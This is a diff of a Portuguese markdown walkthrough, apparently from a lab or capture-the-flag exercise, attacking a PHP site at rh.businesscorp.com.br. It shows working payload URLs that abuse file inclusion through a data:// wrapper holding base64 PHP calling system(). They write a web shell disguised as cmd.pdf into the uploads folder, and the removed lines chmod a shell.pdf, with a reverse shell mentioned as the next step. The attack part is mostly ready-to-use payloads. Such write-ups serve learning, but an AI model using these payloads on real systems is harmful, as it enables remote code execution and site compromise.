@@ -54,13 +54,33 @@ comando que envia pdf malicioso pro site
 
 ```
 - testando se relamente funcionou : http://rh.businesscorp.com.br/uploads/teste.pdf
-<img width="477" height="83" alt="image" src="https://github.com/user-attachments/assets/16a55f59-ce69-440a-b049-861819f3f9fe" />
-
+<p align="center">
+  <img width="477" height="83" alt="image" src="https://github.com/user-attachments/assets/16a55f59-ce69-440a-b049-861819f3f9fe" />
+</p>
 ---
 
-- agora é so mandar o arquivo executa-lo pra me dar a resposta la onde eu to ouvindo:
+- agora é so mandar um arquivo de uma prompt de comando .pdf , ou mandar um arquivo direto com o shell reverse
 
-- dando permissão de executção pro arquivo : http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/shell.pdf
+comando que envia o prompt de comando .pdf pro site : 
+
+```
+  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?    php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C%2Fform%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22  cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C%2Fpre%3E%22%3B%20%3F%3E'%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fcmd.pdf
+```
+
+- agora vamos acessa-lo como acessamos o arquivo teste: http://rh.businesscorp.com.br/uploads/cmd.pdf
+
+<p align="center">
+  <img width="488" height="132" alt="image" src="https://github.com/user-attachments/assets/ab571ec0-a668-4244-98ab-ffc7f5c209ec" />
+</p>
+
+- Temos um aprimoramento de CMD.
+
+
+
+
+
+
+
 
 
 
